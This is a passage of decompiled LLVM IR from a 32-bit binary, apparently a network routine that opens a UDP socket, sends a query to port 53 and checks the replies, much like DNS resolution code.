  %v3_805034b = inttoptr i32 %v2_805034b to i32*
  store i32 %v0_8050339, i32* %v3_805034b, align 4
  %v1_805034c = add i32 %v0_805033e, 8
  %v2_805034c = inttoptr i32 %v1_805034c to i32*
  store i32 1025, i32* %v2_805034c, align 4
  %v1_8050351 = add i32 %v0_805033e, 256
  %v2_8050351 = inttoptr i32 %v1_8050351 to i32*
  %v3_8050351 = load i32, i32* %v2_8050351, align 4
  %v5_8050351 = add i32 %v0_805033e, 4
  %v6_8050351 = inttoptr i32 %v5_8050351 to i32*
  store i32 %v3_8050351, i32* %v6_8050351, align 4
  %v1_8050358 = add i32 %v0_805033e, 28
  %v2_8050358 = inttoptr i32 %v1_8050358 to i32*
  %v3_8050358 = load i32, i32* %v2_8050358, align 4
  %v6_8050358 = inttoptr i32 %v0_805033e to i32*
  store i32 %v3_8050358, i32* %v6_8050358, align 4
  %v5_805035c = call i32 @function_804cea8(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050298, i32 %v3_80502f7)
  %v0_8050361 = load i32, i32* @esp, align 4
  %v1_8050364 = add i32 %v0_8050361, 8
  %v2_8050364 = inttoptr i32 %v1_8050364 to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v2_8050364, align 4
  %v1_8050369 = add i32 %v0_8050361, 4
  %v2_8050369 = inttoptr i32 %v1_8050369 to i32*
  store i32 134540395, i32* %v2_8050369, align 4
  %v1_805036e = add i32 %v0_8050361, 200
  store i32 %v1_805036e, i32* @eax, align 4
  %v3_8050375 = inttoptr i32 %v0_8050361 to i32*
  store i32 %v1_805036e, i32* %v3_8050375, align 4
  %v2_8050376 = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_8050376, i32* %eax.global-to-local, align 4
  %v0_805037b = load i32, i32* @esp, align 4
  %v1_805037b = inttoptr i32 %v0_805037b to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v1_805037b, align 4
  %v1_8050382 = call i32 @function_804ec6b(i32 -1)
  store i32 %v1_8050382, i32* %eax.global-to-local, align 4
  %v0_8050387 = load i32, i32* @esp, align 4
  %v1_8050387 = add i32 %v0_8050387, 56
  %v2_8050387 = inttoptr i32 %v1_8050387 to i32*
  %v3_8050387 = load i32, i32* %v2_8050387, align 4
  store i32 %v3_8050387, i32* %edx.global-to-local, align 4
  %v1_805038b = add i32 %v0_8050387, 268
  %v2_805038b = inttoptr i32 %v1_805038b to i32*
  %v3_805038b = load i32, i32* %v2_805038b, align 4
  store i32 %v3_805038b, i32* %eax.global-to-local, align 4
  %v2_8050392 = mul i32 %v3_8050387, 4
  %v3_8050392 = add i32 %v3_805038b, %v2_8050392
  %v4_8050392 = inttoptr i32 %v3_8050392 to i32*
  %v5_8050392 = load i32, i32* %v4_8050392, align 4
  store i32 %v5_8050392, i32* %edx.global-to-local, align 4
  %v2_8050395 = add i32 %v0_8050387, 48
  %v3_8050395 = inttoptr i32 %v2_8050395 to i32*
  store i32 %v5_8050392, i32* %v3_8050395, align 4
  %v0_8050399 = load i32, i32* @esp, align 4
  %v1_8050399 = add i32 %v0_8050399, 16
  %v1_805039c = add i32 %v0_8050399, 52
  %v2_805039c = inttoptr i32 %v1_805039c to i32*
  %v3_805039c = load i32, i32* %v2_805039c, align 4
  %v5_805039c = icmp slt i32 %v3_805039c, 0
  br i1 %v5_805039c, label %dec_label_pc_805034b.dec_label_pc_80503e2_crit_edge, label %dec_label_pc_80503a3

dec_label_pc_805034b.dec_label_pc_80503e2_crit_edge: ; preds = %dec_label_pc_805034b
  %v0_80503e2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503e2

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_805034b
  store i32 %v3_805039c, i32* %eax.global-to-local, align 4
  %v1_80503a7 = load i32, i32* @global_var_80586d8.197, align 8
  %v2_80503a7 = sub i32 %v3_805039c, %v1_80503a7
  %v8_80503a7 = xor i32 %v1_80503a7, %v3_805039c
  %v9_80503a7 = xor i32 %v2_80503a7, %v3_805039c
  %v10_80503a7 = and i32 %v9_80503a7, %v8_80503a7
  %v11_80503a7 = icmp slt i32 %v10_80503a7, 0
  %v13_80503a7 = icmp slt i32 %v2_80503a7, 0
  %v2_80503ad = icmp eq i1 %v13_80503a7, %v11_80503a7
  br i1 %v2_80503ad, label %dec_label_pc_80503e2, label %dec_label_pc_80503af

dec_label_pc_80503af:                             ; preds = %dec_label_pc_80503a3
  %v2_80503af = add i32 %v0_8050399, 12
  %v3_80503af = inttoptr i32 %v2_80503af to i32*
  store i32 %v3_805039c, i32* %v3_80503af, align 4
  %v1_80503b0 = add i32 %v0_8050399, 8
  %v2_80503b0 = inttoptr i32 %v1_80503b0 to i32*
  store i32 1025, i32* %v2_80503b0, align 4
  %v1_80503b5 = add i32 %v0_8050399, 4
  %v2_80503b5 = inttoptr i32 %v1_80503b5 to i32*
  store i32 ptrtoint (i32* @global_var_80545bc.198 to i32), i32* %v2_80503b5, align 4
  %v1_80503ba = add i32 %v0_8050399, 28
  %v2_80503ba = inttoptr i32 %v1_80503ba to i32*
  %v3_80503ba = load i32, i32* %v2_80503ba, align 4
  %v6_80503ba = inttoptr i32 %v0_8050399 to i32*
  store i32 %v3_80503ba, i32* %v6_80503ba, align 4
  %v0_80503be = call i32 @function_8050fd4()
  store i32 %v0_80503be, i32* %eax.global-to-local, align 4
  %v0_80503c3 = load i32, i32* @esp, align 4
  %v1_80503c6 = add i32 %v0_80503c3, 8
  %v2_80503c6 = inttoptr i32 %v1_80503c6 to i32*
  store i32 1025, i32* %v2_80503c6, align 4
  %v1_80503cb = add i32 %v0_80503c3, 52
  %v2_80503cb = inttoptr i32 %v1_80503cb to i32*
  %v3_80503cb = load i32, i32* %v2_80503cb, align 4
  store i32 %v3_80503cb, i32* %edx.global-to-local, align 4
  %v1_80503cf = mul i32 %v3_80503cb, 4
  %v2_80503cf = add i32 %v1_80503cf, 134579896
  %v3_80503cf = inttoptr i32 %v2_80503cf to i32*
  %v4_80503cf = load i32, i32* %v3_80503cf, align 4
  %v6_80503cf = add i32 %v0_80503c3, 4
  %v7_80503cf = inttoptr i32 %v6_80503cf to i32*
  store i32 %v4_80503cf, i32* %v7_80503cf, align 4
  %v1_80503d6 = add i32 %v0_80503c3, 28
  %v2_80503d6 = inttoptr i32 %v1_80503d6 to i32*
  %v3_80503d6 = load i32, i32* %v2_80503d6, align 4
  %v6_80503d6 = inttoptr i32 %v0_80503c3 to i32*
  store i32 %v3_80503d6, i32* %v6_80503d6, align 4
  %v0_80503da = call i32 @function_8050fd4()
  store i32 %v0_80503da, i32* %eax.global-to-local, align 4
  %v0_80503df = load i32, i32* @esp, align 4
  %v1_80503df = add i32 %v0_80503df, 16
  br label %dec_label_pc_80503e2

dec_label_pc_80503e2:                             ; preds = %dec_label_pc_805034b.dec_label_pc_80503e2_crit_edge, %dec_label_pc_80503a3, %dec_label_pc_80503af
  %v1_80503e2 = phi i32 [ %v1_8050399, %dec_label_pc_805034b.dec_label_pc_80503e2_crit_edge ], [ %v1_8050399, %dec_label_pc_80503a3 ], [ %v1_80503df, %dec_label_pc_80503af ]
  %v0_80503e2 = phi i32 [ %v0_80503e2.pre, %dec_label_pc_805034b.dec_label_pc_80503e2_crit_edge ], [ %v3_805039c, %dec_label_pc_80503a3 ], [ %v0_80503da, %dec_label_pc_80503af ]
  %v2_80503e2 = add i32 %v1_80503e2, -4
  %v3_80503e2 = inttoptr i32 %v2_80503e2 to i32*
  store i32 %v0_80503e2, i32* %v3_80503e2, align 4
  %v0_80503e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80503e3 = add i32 %v1_80503e2, -8
  %v3_80503e3 = inttoptr i32 %v2_80503e3 to i32*
  store i32 %v0_80503e3, i32* %v3_80503e3, align 4
  %v1_80503e4 = add i32 %v1_80503e2, -12
  %v2_80503e4 = inttoptr i32 %v1_80503e4 to i32*
  store i32 1, i32* %v2_80503e4, align 4
  %v1_80503e6 = add i32 %v1_80503e2, 184
  store i32 %v1_80503e6, i32* @eax, align 4
  %v2_80503ed = add i32 %v1_80503e2, -16
  %v3_80503ed = inttoptr i32 %v2_80503ed to i32*
  store i32 %v1_80503e6, i32* %v3_80503ed, align 4
  %v2_80503ee = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_80503ee, i32* %eax.global-to-local, align 4
  %v0_80503f3 = load i32, i32* @esp, align 4
  %v1_80503f3 = add i32 %v0_80503f3, 28
  %v2_80503f3 = inttoptr i32 %v1_80503f3 to i32*
  %v3_80503f3 = load i32, i32* %v2_80503f3, align 4
  store i32 %v3_80503f3, i32* %eax.global-to-local, align 4
  %v1_80503f7 = add i32 %v0_80503f3, 260
  %v2_80503f7 = inttoptr i32 %v1_80503f7 to i32*
  %v3_80503f7 = load i32, i32* %v2_80503f7, align 4
  store i32 %v3_80503f7, i32* @edx, align 4
  %v2_80503fe = add i32 %v0_80503f3, 216
  %v3_80503fe = inttoptr i32 %v2_80503fe to i32*
  store i32 %v3_80503f3, i32* %v3_80503fe, align 4
  %v0_8050405 = load i32, i32* @edx, align 4
  %v1_8050405 = load i32, i32* @esp, align 4
  %v2_8050405 = add i32 %v1_8050405, 220
  %v3_8050405 = inttoptr i32 %v2_8050405 to i32*
  store i32 %v0_8050405, i32* %v3_8050405, align 4
  %v0_805040c = load i32, i32* @esp, align 4
  %v1_805040c = add i32 %v0_805040c, 224
  %v2_805040c = inttoptr i32 %v1_805040c to i32*
  store i32 1, i32* %v2_805040c, align 4
  %v0_805041c = load i32, i32* @esp, align 4
  %v1_805041f = load i32, i32* @ebx, align 4
  %v2_805041f = sub i32 512, %v1_805041f
  %v2_8050421 = add i32 %v0_805041c, 8
  %v3_8050421 = inttoptr i32 %v2_8050421 to i32*
  store i32 %v2_805041f, i32* %v3_8050421, align 4
  %v1_8050422 = load i32, i32* @ebx, align 4
  %v2_8050422 = add i32 %v1_8050422, %v1_805020a
  %v2_8050426 = add i32 %v0_805041c, 4
  %v3_8050426 = inttoptr i32 %v2_8050426 to i32*
  store i32 %v2_8050422, i32* %v3_8050426, align 4
  %v1_8050427 = add i32 %v0_805041c, 216
  store i32 %v1_8050427, i32* @eax, align 4
  %v3_805042e = inttoptr i32 %v0_805041c to i32*
  store i32 %v1_8050427, i32* %v3_805042e, align 4
  %v0_805042f = call i32 @function_8051724()
  store i32 %v0_805042f, i32* %eax.global-to-local, align 4
  %v0_8050434 = load i32, i32* @esp, align 4
  store i32 %v0_805042f, i32* @esi, align 4
  %v2_8050439 = icmp slt i32 %v0_805042f, 0
  br i1 %v2_8050439, label %dec_label_pc_805089d, label %dec_label_pc_8050441

dec_label_pc_8050441:                             ; preds = %dec_label_pc_80503e2
  %v1_8050441 = add i32 %v0_8050434, 172
  %v2_8050441 = inttoptr i32 %v1_8050441 to i16*
  store i16 2, i16* %v2_8050441, align 2
  %v1_805044b = load i32, i32* @esp, align 4
  %v2_805044b = add i32 %v1_805044b, -4
  %v3_805044b = inttoptr i32 %v2_805044b to i32*
  store i32 %v0_805042f, i32* %v3_805044b, align 4
  %v1_805044c = add i32 %v1_805044b, 164
  store i32 %v1_805044c, i32* %eax.global-to-local, align 4
  %v2_8050453 = add i32 %v1_805044b, -8
  %v3_8050453 = inttoptr i32 %v2_8050453 to i32*
  store i32 %v1_805044c, i32* %v3_8050453, align 4
  %v1_8050454 = add i32 %v1_805044b, 32
  %v2_8050454 = inttoptr i32 %v1_8050454 to i32*
  %v3_8050454 = load i32, i32* %v2_8050454, align 4
  %v5_8050454 = add i32 %v1_805044b, -12
  %v6_8050454 = inttoptr i32 %v5_8050454 to i32*
  store i32 %v3_8050454, i32* %v6_8050454, align 4
  %v1_8050458 = add i32 %v1_805044b, -16
  %v2_8050458 = inttoptr i32 %v1_8050458 to i32*
  store i32 10, i32* %v2_8050458, align 4
  %v6_805045a = call i32 @function_8051122(i32 -1, i8* %v5_805045a, i32 %v3_80502f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805045a, i32* %eax.global-to-local, align 4
  %v0_805045f = load i32, i32* @esp, align 4
  %v1_805045f = add i32 %v0_805045f, 16
  %tmp46 = icmp slt i32 %v6_805045a, 1
  br i1 %tmp46, label %dec_label_pc_8050470, label %dec_label_pc_8050466

dec_label_pc_8050466:                             ; preds = %dec_label_pc_8050441
  %v1_8050466 = add i32 %v0_805045f, 172
  %v2_8050466 = inttoptr i32 %v1_8050466 to i16*
  store i16 10, i16* %v2_8050466, align 2
  %v0_8050470.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050470

dec_label_pc_8050470:                             ; preds = %dec_label_pc_8050441, %dec_label_pc_8050466
  %v0_8050487 = phi i32 [ %v1_805045f, %dec_label_pc_8050441 ], [ %v0_8050470.pre, %dec_label_pc_8050466 ]
  %v1_8050470 = add i32 %v0_8050487, 156
  %v2_8050470 = inttoptr i32 %v1_8050470 to i16*
  %v3_8050470 = load i16, i16* %v2_8050470, align 2
  %v12_8050470 = icmp eq i16 %v3_8050470, 10
  %v1_8050479 = icmp eq i1 %v12_8050470, false
  %v1_8050487 = add i32 %v0_8050487, 158
  %v2_8050487 = inttoptr i32 %v1_8050487 to i16*
  store i16 13568, i16* %v2_8050487, align 2
  %v0_8050491 = load i32, i32* @esp, align 4
  br i1 %v1_8050479, label %dec_label_pc_8050487, label %dec_label_pc_80504a7

dec_label_pc_8050487:                             ; preds = %dec_label_pc_8050470
  %v1_8050494 = add i32 %v0_8050491, 32
  %v2_8050494 = inttoptr i32 %v1_8050494 to i32*
  %v3_8050494 = load i32, i32* %v2_8050494, align 4
  %v5_8050494 = add i32 %v0_8050491, -16
  %v6_8050494 = inttoptr i32 %v5_8050494 to i32*
  store i32 %v3_8050494, i32* %v6_8050494, align 4
  %v1_8050498 = call i32 @function_804d200(i32 -1)
  store i32 %v1_8050498, i32* %eax.global-to-local, align 4
  %v1_805049d = load i32, i32* @esp, align 4
  %v2_805049d = add i32 %v1_805049d, 176
  %v3_805049d = inttoptr i32 %v2_805049d to i32*
  store i32 %v1_8050498, i32* %v3_805049d, align 4
  %v0_80504a4 = load i32, i32* @esp, align 4
  %v1_80504a4 = add i32 %v0_80504a4, 16
  br label %dec_label_pc_80504a7

dec_label_pc_80504a7:                             ; preds = %dec_label_pc_8050470, %dec_label_pc_8050487
  %v1_80504a7 = phi i32 [ %v1_80504a4, %dec_label_pc_8050487 ], [ %v0_8050491, %dec_label_pc_8050470 ]
  %v0_80504a7 = load i32, i32* @ecx, align 4
  %v2_80504a7 = add i32 %v1_80504a7, -4
  %v3_80504a7 = inttoptr i32 %v2_80504a7 to i32*
  store i32 %v0_80504a7, i32* %v3_80504a7, align 4
  %v1_80504a8 = add i32 %v1_80504a7, -8
  %v2_80504a8 = inttoptr i32 %v1_80504a8 to i32*
  store i32 17, i32* %v2_80504a8, align 4
  %v1_80504aa = add i32 %v1_80504a7, -12
  %v2_80504aa = inttoptr i32 %v1_80504aa to i32*
  store i32 2, i32* %v2_80504aa, align 4
  %v1_80504ac = add i32 %v1_80504a7, 156
  %v2_80504ac = inttoptr i32 %v1_80504ac to i16*
  %v3_80504ac = load i16, i16* %v2_80504ac, align 2
  %v4_80504ac = zext i16 %v3_80504ac to i32
  store i32 %v4_80504ac, i32* %eax.global-to-local, align 4
  %v2_80504b4 = add i32 %v1_80504a7, -16
  %v3_80504b4 = inttoptr i32 %v2_80504b4 to i32*
  store i32 %v4_80504ac, i32* %v3_80504b4, align 4
  %v4_80504b5 = call i32 @function_804d6e8(i32 -1, i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v4_80504b5, i32* %eax.global-to-local, align 4
  %v1_80504ba = load i32, i32* @esp, align 4
  %v2_80504ba = add i32 %v1_80504ba, 36
  %v3_80504ba = inttoptr i32 %v2_80504ba to i32*
  store i32 %v4_80504b5, i32* %v3_80504ba, align 4
  %v0_80504be = load i32, i32* @esp, align 4
  %v1_80504be = add i32 %v0_80504be, 16
  %v0_80504c1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80504c1 = icmp slt i32 %v0_80504c1, 0
  br i1 %v2_80504c1, label %dec_label_pc_80504ee, label %dec_label_pc_80504c5

dec_label_pc_80504c5:                             ; preds = %dec_label_pc_80504a7
  %v1_80504c5 = add i32 %v0_80504be, 172
  store i32 %v1_80504c5, i32* %eax.global-to-local, align 4
  %v0_80504cc = load i32, i32* @edx, align 4
  %v2_80504cc = add i32 %v0_80504be, 12
  %v3_80504cc = inttoptr i32 %v2_80504cc to i32*
  store i32 %v0_80504cc, i32* %v3_80504cc, align 4
  %v1_80504cd = add i32 %v0_80504be, 8
  %v2_80504cd = inttoptr i32 %v1_80504cd to i32*
  store i32 28, i32* %v2_80504cd, align 4
  %v0_80504cf = load i32, i32* %eax.global-to-local, align 4
  %v2_80504cf = add i32 %v0_80504be, 4
  %v3_80504cf = inttoptr i32 %v2_80504cf to i32*
  store i32 %v0_80504cf, i32* %v3_80504cf, align 4
  %v1_80504d0 = add i32 %v0_80504be, 36
  %v2_80504d0 = inttoptr i32 %v1_80504d0 to i32*
  %v3_80504d0 = load i32, i32* %v2_80504d0, align 4
  %v6_80504d0 = inttoptr i32 %v0_80504be to i32*
  store i32 %v3_80504d0, i32* %v6_80504d0, align 4
  %v4_80504d4 = call i32 @function_804d5e4(i32 -1, i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v4_80504d4, i32* %eax.global-to-local, align 4
  %v0_80504d9 = load i32, i32* @esp, align 4
  %v2_80504dc = icmp slt i32 %v4_80504d4, 0
  %v1_80504de = icmp eq i1 %v2_80504dc, false
  br i1 %v1_80504de, label %dec_label_pc_80504f7, label %dec_label_pc_80504e0

dec_label_pc_80504e0:                             ; preds = %dec_label_pc_80504c5
  %v1_80504e0 = call i32 @function_804b4bc(i32 -1)
  store i32 %v1_80504e0, i32* %eax.global-to-local, align 4
  %v1_80504e5 = inttoptr i32 %v1_80504e0 to i32*
  %v2_80504e5 = load i32, i32* %v1_80504e5, align 4
  %v11_80504e5 = icmp eq i32 %v2_80504e5, 101
  %v0_8050857.pre = load i32, i32* @esp, align 4
  br i1 %v11_80504e5, label %dec_label_pc_8050857, label %dec_label_pc_80504ee

dec_label_pc_80504ee:                             ; preds = %dec_label_pc_80504e0, %dec_label_pc_80504a7
  %v17_80504ee = phi i32 [ %v1_80504be, %dec_label_pc_80504a7 ], [ %v0_8050857.pre, %dec_label_pc_80504e0 ]
  %v1_80504ee = add i32 %v17_80504ee, 28
  %v2_80504ee = inttoptr i32 %v1_80504ee to i32*
  %v3_80504ee = load i32, i32* %v2_80504ee, align 4
  %v4_80504ee = add i32 %v3_80504ee, 1
  store i32 %v4_80504ee, i32* %v2_80504ee, align 4
  br label %dec_label_pc_8050878.backedge

dec_label_pc_80504f7:                             ; preds = %dec_label_pc_80504c5
  %v0_80504f7 = load i32, i32* @ebx, align 4
  %v1_80504f7 = load i32, i32* @esi, align 4
  %v2_80504f7 = add i32 %v1_80504f7, %v0_80504f7
  store i32 %v2_80504f7, i32* %eax.global-to-local, align 4
  %v1_80504fa = add i32 %v0_80504d9, 12
  %v2_80504fa = inttoptr i32 %v1_80504fa to i32*
  store i32 0, i32* %v2_80504fa, align 4
  %v0_80504fc = load i32, i32* %eax.global-to-local, align 4
  %v2_80504fc = add i32 %v0_80504d9, 8
  %v3_80504fc = inttoptr i32 %v2_80504fc to i32*
  store i32 %v0_80504fc, i32* %v3_80504fc, align 4
  %v2_80504fd = add i32 %v0_80504d9, 4
  %v3_80504fd = inttoptr i32 %v2_80504fd to i32*
  store i32 %v1_805020a, i32* %v3_80504fd, align 4
  %v1_80504fe = add i32 %v0_80504d9, 36
  %v2_80504fe = inttoptr i32 %v1_80504fe to i32*
  %v3_80504fe = load i32, i32* %v2_80504fe, align 4
  %v6_80504fe = inttoptr i32 %v0_80504d9 to i32*
  store i32 %v3_80504fe, i32* %v6_80504fe, align 4
  %v0_8050502 = call i32 @function_8050bb8()
  store i32 %v0_8050502, i32* %eax.global-to-local, align 4
  %v0_8050507 = load i32, i32* @esp, align 4
  %v1_8050507 = add i32 %v0_8050507, 36
  %v2_8050507 = inttoptr i32 %v1_8050507 to i32*
  %v3_8050507 = load i32, i32* %v2_8050507, align 4
  %v2_805050b = add i32 %v0_8050507, 228
  %v3_805050b = inttoptr i32 %v2_805050b to i32*
  store i32 %v3_8050507, i32* %v3_805050b, align 4
  %v0_8050512 = load i32, i32* @esp, align 4
  %v1_8050512 = add i32 %v0_8050512, 232
  %v2_8050512 = inttoptr i32 %v1_8050512 to i16*
  store i16 1, i16* %v2_8050512, align 2
  %v0_805051c = load i32, i32* @esp, align 4
  %v1_805051f = add i32 %v0_805051c, 8
  %v2_805051f = inttoptr i32 %v1_805051f to i32*
  store i32 10000, i32* %v2_805051f, align 4
  %v1_8050524 = add i32 %v0_805051c, 4
  %v2_8050524 = inttoptr i32 %v1_8050524 to i32*
  store i32 1, i32* %v2_8050524, align 4
  %v1_8050526 = add i32 %v0_805051c, 228
  store i32 %v1_8050526, i32* %eax.global-to-local, align 4
  %v3_805052d = inttoptr i32 %v0_805051c to i32*
  store i32 %v1_8050526, i32* %v3_805052d, align 4
  %v0_805052e = call i32 @function_8050ccc()
  store i32 %v0_805052e, i32* %eax.global-to-local, align 4
  %v0_8050533 = load i32, i32* @esp, align 4
  %v1_8050533 = add i32 %v0_8050533, 16
  %tmp47 = icmp slt i32 %v0_805052e, 1
  br i1 %tmp47, label %dec_label_pc_8050857, label %dec_label_pc_805053e

dec_label_pc_805053e:                             ; preds = %dec_label_pc_80504f7
  %v1_805053e = add i32 %v0_8050533, 12
  %v2_805053e = inttoptr i32 %v1_805053e to i32*
  store i32 0, i32* %v2_805053e, align 4
  %v1_8050540 = add i32 %v0_8050533, 8
  %v2_8050540 = inttoptr i32 %v1_8050540 to i32*
  store i32 512, i32* %v2_8050540, align 4
  %v2_8050545 = add i32 %v0_8050533, 4
  %v3_8050545 = inttoptr i32 %v2_8050545 to i32*
  store i32 %v1_805020a, i32* %v3_8050545, align 4
  %v1_8050546 = add i32 %v0_8050533, 36
  %v2_8050546 = inttoptr i32 %v1_8050546 to i32*
  %v3_8050546 = load i32, i32* %v2_8050546, align 4
  %v6_8050546 = inttoptr i32 %v0_8050533 to i32*
  store i32 %v3_8050546, i32* %v6_8050546, align 4
  %v5_805054a = call i32 @function_804d634(i32 -1, i32 %v15_8050298, i32 %v3_80502f7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805054a, i32* @eax, align 4
  %v1_805054f = load i32, i32* @esp, align 4
  %v2_805054f = add i32 %v1_805054f, 32
  %v3_805054f = inttoptr i32 %v2_805054f to i32*
  store i32 %v5_805054a, i32* %v3_805054f, align 4
  %v0_8050553 = load i32, i32* @esp, align 4
  %v1_8050553 = add i32 %v0_8050553, 16
  %v7_8050559 = icmp sgt i32 %v5_805054a, 11
  br i1 %v7_8050559, label %dec_label_pc_805055f, label %dec_label_pc_805080c

dec_label_pc_805055f:                             ; preds = %dec_label_pc_805053e
  %v0_805055f = load i32, i32* @ebx, align 4
  %v2_805055f = add i32 %v0_8050553, 12
  %v3_805055f = inttoptr i32 %v2_805055f to i32*
  store i32 %v0_805055f, i32* %v3_805055f, align 4
  %v0_8050560 = load i32, i32* @ebx, align 4
  %v2_8050560 = add i32 %v0_8050553, 8
  %v3_8050560 = inttoptr i32 %v2_8050560 to i32*
  store i32 %v0_8050560, i32* %v3_8050560, align 4
  %v1_8050561 = add i32 %v0_8050553, 84
  store i32 %v1_8050561, i32* %eax.global-to-local, align 4
  %v2_8050565 = add i32 %v0_8050553, 4
  %v3_8050565 = inttoptr i32 %v2_8050565 to i32*
  store i32 %v1_8050561, i32* %v3_8050565, align 4
  %v3_8050566 = inttoptr i32 %v0_8050553 to i32*
  store i32 %v1_805020a, i32* %v3_8050566, align 4
  %v0_8050567 = call i32 @function_8051678()
  store i32 %v0_8050567, i32* %eax.global-to-local, align 4
  %v0_805056c = load i32, i32* @esp, align 4
  %v1_805056c = add i32 %v0_805056c, 84
  %v2_805056c = inttoptr i32 %v1_805056c to i32*
  %v3_805056c = load i32, i32* %v2_805056c, align 4
  store i32 %v3_805056c, i32* %edx.global-to-local, align 4
  %v2_8050570 = add i32 %v0_805056c, 72
  %v3_8050570 = inttoptr i32 %v2_8050570 to i32*
  store i32 %v3_805056c, i32* %v3_8050570, align 4
  %v0_8050574 = load i32, i32* @esp, align 4
  %v1_8050574 = add i32 %v0_8050574, 16
  %v1_8050577 = add i32 %v0_8050574, 60
  %v2_8050577 = inttoptr i32 %v1_8050577 to i32*
  %v3_8050577 = load i32, i32* %v2_8050577, align 4
  store i32 %v3_8050577, i32* @eax, align 4
  %v0_805057b = load i32, i32* %edx.global-to-local, align 4
  %v12_805057b = icmp eq i32 %v0_805057b, %v3_8050577
  %v1_805057d = icmp eq i1 %v12_805057b, false
  br i1 %v1_805057d, label %dec_label_pc_805080c, label %dec_label_pc_8050583

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805055f
  %v1_8050583 = add i32 %v0_8050574, 88
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  %v4_8050583 = icmp eq i32 %v3_8050583, 0
  br i1 %v4_8050583, label %dec_label_pc_805080c, label %dec_label_pc_805058e

dec_label_pc_805058e:                             ; preds = %dec_label_pc_8050583
  %v1_805058e = add i32 %v0_8050574, 112
  %v2_805058e = inttoptr i32 %v1_805058e to i32*
  %v3_805058e = load i32, i32* %v2_805058e, align 4
  store i32 %v3_805058e, i32* @eax, align 4
  %v9_8050592 = icmp eq i32 %v3_805058e, 3
  %v1_8050595 = icmp eq i1 %v9_8050592, false
  br i1 %v1_8050595, label %dec_label_pc_80505fd, label %dec_label_pc_8050597

dec_label_pc_8050597:                             ; preds = %dec_label_pc_805058e
  %v1_8050597 = add i32 %v0_8050574, 67
  %v2_8050597 = inttoptr i32 %v1_8050597 to i8*
  %v3_8050597 = load i8, i8* %v2_8050597, align 1
  %v4_8050597 = icmp eq i8 %v3_8050597, 0
  %v1_805059c = icmp eq i1 %v4_8050597, false
  br i1 %v1_805059c, label %dec_label_pc_80505ed, label %dec_label_pc_805059e

dec_label_pc_805059e:                             ; preds = %dec_label_pc_8050597
  %v0_805059e = load i32, i32* @ecx, align 4
  %v2_805059e = add i32 %v0_8050574, 12
  %v3_805059e = inttoptr i32 %v2_805059e to i32*
  store i32 %v0_805059e, i32* %v3_805059e, align 4
  %v1_805059f = add i32 %v0_8050574, 8
  %v2_805059f = inttoptr i32 %v1_805059f to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v2_805059f, align 4
  %v1_80505a4 = add i32 %v0_8050574, 4
  %v2_80505a4 = inttoptr i32 %v1_80505a4 to i32*
  store i32 134540395, i32* %v2_80505a4, align 4
  %v1_80505a9 = add i32 %v0_8050574, 200
  store i32 %v1_80505a9, i32* @esi, align 4
  %v3_80505b0 = inttoptr i32 %v0_8050574 to i32*
  store i32 %v1_80505a9, i32* %v3_80505b0, align 4
  %v2_80505b1 = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_80505b1, i32* %eax.global-to-local, align 4
  %v0_80505b6 = load i32, i32* @esp, align 4
  %v1_80505b6 = inttoptr i32 %v0_80505b6 to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v1_80505b6, align 4
  %v1_80505bd = call i32 @function_804ec6b(i32 -1)
  store i32 %v1_80505bd, i32* %eax.global-to-local, align 4
  %v0_80505c2 = load i32, i32* @esp, align 4
  %v1_80505c2 = inttoptr i32 %v0_80505c2 to i32*
  %v2_80505c2 = load i32, i32* %v1_80505c2, align 4
  store i32 %v2_80505c2, i32* @eax, align 4
  %v3_80505c2 = add i32 %v0_80505c2, 4
  %v1_80505c3 = inttoptr i32 %v3_80505c2 to i32*
  %v2_80505c3 = load i32, i32* %v1_80505c3, align 4
  store i32 %v2_80505c3, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80505c3, align 4
  %v0_80505c6 = load i32, i32* @esi, align 4
  store i32 %v0_80505c6, i32* %v1_80505c2, align 4
  %v0_80505c7 = load i32, i32* @global_var_80586d8.197, align 8
  store i32 %v0_80505c7, i32* %ebx.global-to-local, align 4
  %v2_80505cd = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_80505cd, i32* %eax.global-to-local, align 4
  %v0_80505d2 = load i32, i32* @esp, align 4
  %v1_80505d5 = add i32 %v0_80505c7, -1
  store i32 %v1_80505d5, i32* @ebx, align 4
  %v1_80505d6 = add i32 %v0_80505d2, 52
  %v2_80505d6 = inttoptr i32 %v1_80505d6 to i32*
  %v3_80505d6 = load i32, i32* %v2_80505d6, align 4
  %v5_80505d6 = sub i32 %v3_80505d6, %v1_80505d5
  %v11_80505d6 = xor i32 %v3_80505d6, %v1_80505d5
  %v12_80505d6 = xor i32 %v5_80505d6, %v3_80505d6
  %v13_80505d6 = and i32 %v12_80505d6, %v11_80505d6
  %v14_80505d6 = icmp slt i32 %v13_80505d6, 0
  %v16_80505d6 = icmp slt i32 %v5_80505d6, 0
  %v2_80505da = icmp eq i1 %v16_80505d6, %v14_80505d6
  br i1 %v2_80505da, label %dec_label_pc_80505ed, label %dec_label_pc_80505dc

dec_label_pc_80505dc:                             ; preds = %dec_label_pc_805059e
  %v4_80505dc = add i32 %v3_80505d6, 1
  store i32 %v4_80505dc, i32* %v2_80505d6, align 4
  %v0_80505e0 = load i32, i32* @esp, align 4
  %v1_80505e0 = add i32 %v0_80505e0, 56
